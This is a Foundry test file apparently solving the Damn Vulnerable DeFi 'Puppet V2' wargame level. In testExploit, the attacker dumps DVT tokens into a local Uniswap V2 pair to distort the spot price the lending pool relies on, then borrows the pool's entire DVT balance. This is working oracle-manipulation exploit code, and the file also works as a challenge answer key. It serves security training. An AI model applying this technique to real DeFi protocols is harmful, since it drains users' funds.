// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {WETH9} from "../../../src/Contracts/WETH9.sol";

import {PuppetV2Pool} from "../../../src/Contracts/puppet-v2/PuppetV2Pool.sol";

import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../src/Contracts/puppet-v2/Interfaces.sol";

import {UniswapV2Library} from "../../../src/Contracts/puppet-v2/UniswapV2Library.sol";

contract PuppetV2 is Test {
    // Uniswap exchange will start with 100 DVT and 10 WETH in liquidity
    uint256 internal constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
    uint256 internal constant UNISWAP_INITIAL_WETH_RESERVE = 10 ether;

    // attacker will start with 10_000 DVT and 20 ETH
    uint256 internal constant ATTACKER_INITIAL_TOKEN_BALANCE = 10_000e18;
    uint256 internal constant ATTACKER_INITIAL_ETH_BALANCE = 20 ether;

    // pool will start with 1_000_000 DVT
    uint256 internal constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
    uint256 internal constant DEADLINE = 10_000_000;

    IUniswapV2Pair internal uniswapV2Pair;
    IUniswapV2Factory internal uniswapV2Factory;
    IUniswapV2Router02 internal uniswapV2Router;

    DamnValuableToken internal dvt;
    WETH9 internal weth;

    PuppetV2Pool internal puppetV2Pool;
    address payable internal attacker;
    address payable internal deployer;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */
        attacker = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
        );
        vm.label(attacker, "Attacker");
        vm.deal(attacker, ATTACKER_INITIAL_ETH_BALANCE);

        deployer = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("deployer")))))
        );
        vm.label(deployer, "deployer");

        // Deploy token to be traded in Uniswap
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        weth = new WETH9();
        vm.label(address(weth), "WETH");
        // Deploy Uniswap Factory and Router
        uniswapV2Factory = IUniswapV2Factory(
            deployCode(
                "./src/build-uniswap/v2/UniswapV2Factory.json",
                abi.encode(address(0))
            )
        );

        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                "./src/build-uniswap/v2/UniswapV2Router02.json",
                abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        // Create Uniswap pair against WETH and add liquidity
        dvt.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(dvt),
            UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
            0, // amountTokenMin
            0, // amountETHMin
            deployer, // to
            DEADLINE // deadline
        );

        // Get a reference to the created Uniswap pair
        uniswapV2Pair = IUniswapV2Pair(
            uniswapV2Factory.getPair(address(dvt), address(weth))
        );

        assertGt(uniswapV2Pair.balanceOf(deployer), 0);

        // Deploy the lending pool
        puppetV2Pool = new PuppetV2Pool(
            address(weth),
            address(dvt),
            address(uniswapV2Pair),
            address(uniswapV2Factory)
        );

        // Setup initial token balances of pool and attacker account
        dvt.transfer(attacker, ATTACKER_INITIAL_TOKEN_BALANCE);
        dvt.transfer(address(puppetV2Pool), POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool.
        console.log("check");
        assertEq(puppetV2Pool.calculateDepositOfWETHRequired(1e18), 0.3 ether);

        assertEq(
            puppetV2Pool.calculateDepositOfWETHRequired(
                POOL_INITIAL_TOKEN_BALANCE
            ),
            300_000 ether
        );

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function quoteWETHForDVT(uint256 amtDVT) private view returns (uint256) {
        (uint256 reservesWETH, uint256 reservesDVT) = UniswapV2Library
            .getReserves(
                address(uniswapV2Factory),
                address(weth),
                address(dvt)
            );
        return calculateAmountAToAmountB(amtDVT, reservesDVT, reservesWETH);
    }

    function calculateAmountAToAmountB(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) internal pure returns (uint256) {
        uint256 input_amount_with_fee = amountA * 997;
        uint256 numerator = input_amount_with_fee * reserveB;
        uint256 denominator = (reserveA * 1000) + input_amount_with_fee;
        return numerator / denominator;
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */

        // initially, the WETH-DVT pair has  10e18 wei = 100e18 DVT, so 1 wei = 10 DVT.
        // One might expect, then, based on the calculation of:
        // AmountDVT = AmountWei * ReserveDVT/ReserveWei
        // AmountDVT = 1 wei * 10 DVT/1wei = 10 DVT
        // So 10 DVT is required for 1 wei, So the amount required to borrow 1e18 DVT is:
        // 1e17 * 3, which is exactly 0.3 eth.
        // But all the dividing business in the Pool is concerning. Decimal should only be used for
        // display not for calculation, otherwise there would be rounding errors.

        // How much wei do we need to borrow 1 DVT? It's nothing, because of rounding errors
        console.log(
            "Borrowing 1 DVT cost %i",
            puppetV2Pool.calculateDepositOfWETHRequired(1)
        );

        // First, we adjust the ratio in the Uniswap Pair by performing a swap
        // We put more DVT into the Pair, thereby increasing the denominator in the above formula
        uint256 amountAttackerDVT = dvt.balanceOf(address(attacker));
        console.log(
            "before: attacker funds of %e DVT expected to yield %e",
            amountAttackerDVT,
            quoteWETHForDVT(amountAttackerDVT)
        );
        vm.startPrank(attacker);
        dvt.approve(address(uniswapV2Router), amountAttackerDVT);
        address[] memory tokenPaths = new address[](2);
        tokenPaths[0] = address(dvt);
        tokenPaths[1] = address(weth);
        uniswapV2Router.swapExactTokensForTokens(
            amountAttackerDVT,
            quoteWETHForDVT(amountAttackerDVT),
            tokenPaths,
            address(attacker),
            1000
        );

        console.log(
            "balance of attacker after = %e",
            weth.balanceOf(address(attacker))
        );

        uint256 borrowAmt = 10000;
        uint256 balance = dvt.balanceOf(address(puppetV2Pool));
        console.log(
            "after: Uniswap %e DVT requires %e Wwei",
            borrowAmt,
            quoteWETHForDVT(borrowAmt)
        );

        // Much less WETH required now to borrow the pool
        console.log(
            "after: PuppetPool %e DVT requires %e Wwei",
            balance,
            puppetV2Pool.calculateDepositOfWETHRequired(balance)
        );

        // Deposit ETH into WETH contract from attacker account
        weth.deposit{
            value: puppetV2Pool.calculateDepositOfWETHRequired(balance) -
                weth.balanceOf(address(attacker))
        }();
        weth.approve(address(puppetV2Pool), weth.balanceOf(address(attacker)));
        puppetV2Pool.borrow(balance);

        console.log(
            "attacker eth balance = %e and weth balance = %e",
            address(attacker).balance,
            weth.balanceOf(address(attacker))
        );

        vm.stopPrank();

        /**
         * EXPLOIT END *
         */
        validation();
        console.log(
            unicode"\n🎉 Congratulations, you can go to the next level! 🎉"
        );
    }

    function validation() internal {
        /**
         * SUCCESS CONDITIONS
         */

        // Attacker has taken all tokens from the pool
        assertEq(dvt.balanceOf(attacker), POOL_INITIAL_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(puppetV2Pool)), 0);
    }
}
